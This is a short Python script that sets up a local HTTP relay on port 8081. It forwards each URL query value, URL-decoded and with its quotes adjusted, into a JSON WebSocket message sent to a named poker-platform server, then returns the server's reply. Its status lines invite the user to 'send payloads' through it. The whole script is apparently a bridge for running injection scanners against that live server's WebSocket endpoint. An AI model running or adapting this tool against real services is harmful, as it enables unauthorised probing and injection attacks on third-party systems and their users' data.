from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "wss://aa.pokerserversoftware.com/front"

def send_ws(payload):
    ws = create_connection(ws_server)
    init_data = '{"t":"ClientVersion","clientVersion":"HTML5","locale":"ru",'\
            '"protocolVersion":553,"skinName":"evenbet","id":1002}'
    ws.send(init_data)
    resp = ws.recv()
    print(resp)
    resp = ws.recv()
    print(resp)
    
    message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
    data = '{"t":"%s","id":1013}' % message

    ws.send(data)
    resp = ws.recv()
    ws.close()

    if resp:
        print(resp)
        return resp
    else:
        return ''

def middleware_server(host_port,content_type="text/plain"):

    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False
                
            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")

try:
    middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
    pass

